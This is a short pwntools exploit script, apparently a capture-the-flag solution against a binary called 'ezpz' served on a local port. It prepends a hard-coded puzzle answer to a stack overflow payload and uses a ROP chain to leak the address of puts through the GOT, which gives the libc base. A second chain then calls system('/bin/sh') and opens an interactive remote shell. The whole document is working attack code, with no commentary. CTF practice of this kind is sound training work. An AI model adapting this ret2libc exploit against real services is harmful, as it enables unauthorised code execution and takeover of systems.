from pwn import *

PUZZLE_SOL = '0101000000001000000101010000101000000001000000000101000110100000000100000010101000000100000000100100001010100000001000000010101000101000000000000000101010010101000000000000000001010100010101000000'

exe = ELF("../publish/ezpz")
libc = ELF("../publish/libc-2.35.so")

conn = remote('0.0.0.0', 1337)

rop = ROP(exe)
main = 0x4014a0
pop_rdi = rop.rdi.address
ret = rop.ret.address

payload = b''.join([
    PUZZLE_SOL.encode(),
    b'X' * 36,
    p64(pop_rdi),
    p64(exe.got['puts']),
    p64(exe.plt['puts']),
    p64(main)
])
conn.sendline(payload)

conn.recvline()
conn.recvline()
puts_leak = u64(conn.recvline().strip().ljust(8, b'\x00'))
libc_base = puts_leak - libc.symbols['puts']
print('leak', hex(puts_leak))
log.success(f'libc_base: {hex(libc_base)}')

system = libc_base + libc.symbols['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh\x00'))

payload = b''.join([
    PUZZLE_SOL.encode(),
    b'X' * 36,
    p64(ret),
    p64(pop_rdi),
    p64(bin_sh),
    p64(system),
])
conn.sendline(payload)

conn.interactive()
